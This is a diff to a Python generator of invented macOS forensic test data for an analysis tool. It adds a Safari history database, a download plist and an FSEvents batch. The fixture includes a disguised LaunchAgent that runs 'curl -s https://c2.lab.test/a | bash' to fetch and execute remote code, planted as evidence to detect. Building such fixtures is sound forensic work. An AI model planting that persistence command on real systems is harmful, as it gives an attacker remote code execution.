@@ -12,6 +12,10 @@ The Mac (invented lab data: LAB-MAC, alice, .test domains):
   - quarantine events: Safari downloaded tools.dmg, Mail saved invoice.pdf
   - KnowledgeC: Safari and Terminal in front, with durations
   - alice's .zsh_history with an rm -P (secure delete) of a file
+  - Safari: History.db (three visits, one a search, and a page whose visits
+    are gone) and Downloads.plist (tools.dmg)
+  - FSEvents: one gzip batch (version 2 pages) with plan.txt created,
+    modified and removed, and a renamed folder
 
 Property lists are written with plistlib (binary and XML), databases with
 sqlite3, so they are what macOS writes as far as Kokino reads them.
@@ -23,6 +27,7 @@ import io
 import os
 import plistlib
 import sqlite3
+import struct
 import tarfile
 import tempfile
 from datetime import datetime, timezone
@@ -67,6 +72,42 @@ def knowledge():
         return open(p, "rb").read()
 
 
+def safari():
+    with tempfile.TemporaryDirectory() as d:
+        p = os.path.join(d, "h.db")
+        c = sqlite3.connect(p)
+        c.execute("CREATE TABLE history_items (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT NOT NULL UNIQUE, domain_expansion TEXT NULL, visit_count INTEGER NOT NULL, daily_visit_counts BLOB NOT NULL, weekly_visit_counts BLOB NULL, autocomplete_triggers BLOB NULL, should_recompute_derived_visit_counts INTEGER NOT NULL, visit_count_score INTEGER NOT NULL)")
+        c.execute("CREATE TABLE history_visits (id INTEGER PRIMARY KEY AUTOINCREMENT, history_item INTEGER NOT NULL REFERENCES history_items(id) ON DELETE CASCADE, visit_time REAL NOT NULL, title TEXT NULL, load_successful BOOLEAN NOT NULL DEFAULT 1, http_non_get BOOLEAN NOT NULL DEFAULT 0, synthesized BOOLEAN NOT NULL DEFAULT 0, redirect_source INTEGER NULL UNIQUE REFERENCES history_visits(id) ON DELETE CASCADE, redirect_destination INTEGER NULL UNIQUE REFERENCES history_visits(id) ON DELETE CASCADE, origin INTEGER NOT NULL DEFAULT 0, generation INTEGER NOT NULL DEFAULT 0, attributes INTEGER NOT NULL DEFAULT 0, score INTEGER NOT NULL DEFAULT 0)")
+        items = [
+            (1, "https://www.google.com/search?q=how+to+wipe+a+mac", "google", 1),
+            (2, "https://lab.test/tools", "lab", 1),
+            (3, "https://downloads.lab.test/tools.dmg", "lab", 1),
+            (4, "https://old.lab.test/forgotten", "lab", 3),
+        ]
+        c.executemany("INSERT INTO history_items (id, url, domain_expansion, visit_count, daily_visit_counts, should_recompute_derived_visit_counts, visit_count_score) VALUES (?,?,?,?,x'',0,0)", items)
+        visits = [(1, mac(T0 + 400), "how to wipe a mac - Google Search"), (2, mac(T0 + 550), "Lab tools"), (3, mac(T0 + 600), None)]
+        c.executemany("INSERT INTO history_visits (history_item, visit_time, title) VALUES (?,?,?)", visits)
+        c.commit()
+        c.close()
+        return open(p, "rb").read()
+
+
+def fsevents():
+    """One FSEvents batch, gzip, version 2 pages (High Sierra and later)."""
+    def page(recs):
+        body = b""
+        for path, eid, flags, node in recs:
+            body += path.encode() + b"\0" + struct.pack("<Q", eid) + struct.pack(">I", flags) + struct.pack("<Q", node)
+        return b"2SLD" + struct.pack("<I", 0) + struct.pack("<I", len(body) + 12) + body
+    recs = [
+        ("Users/alice/Documents/plan.txt", 0xA1B2C0, 0x01008000 | 0x10000000, 9001),
+        ("Users/alice/Documents/plan.txt", 0xA1B2C1, 0x02008000, 9001),
+        ("Users/alice/Projects/old-name", 0xA1B2C2, 0x08000001, 9002),
+        ("Users/alice/Projects/new-name", 0xA1B2C3, 0x08000001, 9002),
+    ]
+    return gzip.compress(page(recs[:2]) + page(recs[2:]), mtime=0)
+
+
 def tree():
     user = lambda name, uid, real, shell="/bin/zsh": plistlib.dumps({
         "name": [name], "uid": [str(uid)], "gid": ["20"], "realname": [real], "home": ["/Users/" + name],
@@ -87,6 +128,14 @@ def tree():
         "/Users/alice/Library/LaunchAgents/com.apple.sysmond.plist": plistlib.dumps({"Label": "com.apple.sysmond", "ProgramArguments": ["/bin/bash", "-c", "curl -s https://c2.lab.test/a | bash"], "RunAtLoad": True, "StartInterval": 600}, fmt=plistlib.FMT_BINARY),
         "/Users/alice/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2": quarantine(),
         "/Users/alice/Library/Application Support/Knowledge/knowledgeC.db": knowledge(),
+        "/Users/alice/Library/Safari/History.db": safari(),
+        "/Users/alice/Library/Safari/Downloads.plist": plistlib.dumps({"DownloadHistory": [{
+            "DownloadEntryURL": "https://downloads.lab.test/tools.dmg", "DownloadEntryPath": "~/Downloads/tools.dmg",
+            "DownloadEntryDateAddedKey": datetime.fromtimestamp(T0 + 600, timezone.utc).replace(tzinfo=None),
+            "DownloadEntryDateFinishedKey": datetime.fromtimestamp(T0 + 610, timezone.utc).replace(tzinfo=None),
+            "DownloadEntryProgressBytesSoFar": 52428800, "DownloadEntryProgressTotalToLoad": 52428800,
+            "DownloadEntryIdentifier": "8F1E2D3C-0000-4000-8000-0000000000AA"}]}, fmt=plistlib.FMT_BINARY),
+        "/.fseventsd/0000000000a1b2c3": (fsevents(), T0 + 9000),
         "/Users/alice/.zsh_history": ": %d:0;ls -la\n: %d:0;hdiutil attach ~/Downloads/tools.dmg\n: %d:0;rm -P ~/Documents/plan.txt\n" % (T0 + 7300, T0 + 7350, T0 + 7400),
     }
 
